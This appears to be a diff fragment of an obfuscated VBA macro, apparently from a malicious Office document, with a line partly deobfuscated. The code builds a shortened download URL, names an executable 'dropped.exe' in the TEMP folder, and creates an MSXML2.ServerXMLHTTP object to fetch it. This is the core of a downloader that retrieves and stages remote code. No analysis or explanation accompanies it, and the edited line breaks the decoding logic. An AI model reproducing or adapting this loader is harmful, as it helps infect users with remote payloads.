@@ -9,7 +9,7 @@ Dim vxedylctlyqvkl As String
 Dim yxxqowke As String
 Dim yqlcangepvrccrx As Object, tmffoscpfdripcxpd As Object
 Dim afcbydld As Integer
-vxedylctlyqvkl = hgmneqolwgxg("68747470733a2f2f74696e") & hgmneqolwgxg("7975726c2e636f6d2f67327a3267683666")
+vxedylctlyqvkl = hgmneqolwgxg("https://tin") & hgmneqolwgxg("yurl.com/g2z2gh6f")
 yxxqowke = hgmneqolwgxg("64726f") & hgmneqolwgxg("707065642e657865")
 yxxqowke = Environ("TEMP") & "\" & yxxqowke
 Set yqlcangepvrccrx = CreateObject(hgmneqolwgxg("4d53584d4c322e") & hgmneqolwgxg("536572766572584d4c485454502e362e30"))
